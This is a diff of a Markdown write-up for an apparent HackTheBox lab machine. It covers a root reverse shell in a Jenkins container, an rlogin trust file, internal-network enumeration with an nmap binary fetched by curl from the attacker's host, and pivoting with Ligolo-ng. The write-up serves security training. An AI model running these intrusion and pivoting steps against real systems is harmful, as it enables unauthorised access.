@@ -548,7 +548,7 @@ root@5ac6c7d6fb8e:/var/jenkins_home/workspace/build_dev_main#
 
 We received a reverse shell as the root user inside the Jenkins container, confirming remote code execution through the CI/CD pipeline.
 
-We know we're in a container because of the alphanumeric string in the hostname:
+We know we are inside a container because of the random alphanumeric string as the hostname:
 
 <br />
 
@@ -575,7 +575,7 @@ intern.build.vl +
 
 <br />
 
-As we know, this file indicates the allowed hosts to connect via `rlogin` to the principal machine without giving a password:
+As we know, this file indicates the allowed hosts to connect via `rlogin` to the principal machine without giving a password.
 
 <br />
 
@@ -585,8 +585,9 @@ As we know, this file indicates the allowed hosts to connect via `rlogin` to the
 
 One peculiarity of this machine is that it has an internal network. In my case, I had never before seen a machine on HackTheBox that required you to enumerate an internal network, so it took me a bit by surprise when I solved the machine for the first time.
 
-To enumerate this network we will bring the following [nmap](https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/nmap) static binary to the container and our `/etc/services` file, that is neccessary to run the scans.
+To enumerate this network we will bring the following [nmap](https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/nmap) static binary and our `/etc/services` file to the container.
 
+<br />
 
 ```bash
 curl http://10.10.14.253/nmap -o nmap
@@ -595,7 +596,7 @@ curl http://10.10.14.253/services -o /etc/services
 
 <br />
 
-Now, we can run the `nmap` scan to discover the internal network:
+Now, we can run a basic `nmap` scan to discover the internal network:
 
 <br />
 
@@ -659,3 +660,22 @@ Nmap done: 256 IP addresses (6 hosts up) scanned in 3.33 seconds
 ```
 
 <br />
+
+There are 6 opens hosts with its corresponding services running. Among others, we can identify a few relevant services in the output:
+
+- MySQL - 172.18.0.4 
+
+- HTTP 8081 - 172.18.0.5 
+
+- HTTP 80 (powerdns) - 172.18.0.6
+
+<br />
+
+### LigoloNG 
+
+<br />
+
+To enumerate these services from our attacking machine, we recommend using the pivot tool [LigoloNG](https://github.com/nicocha30/ligolo-ng). If you don't know how to use it, please refer to the following [website](https://medium.com/@redfanatic7/guide-to-pivoting-using-ligolo-ng-efd36b290f16), which explains very well how to install and setup this tool to establish a tunnel.
+
+
+
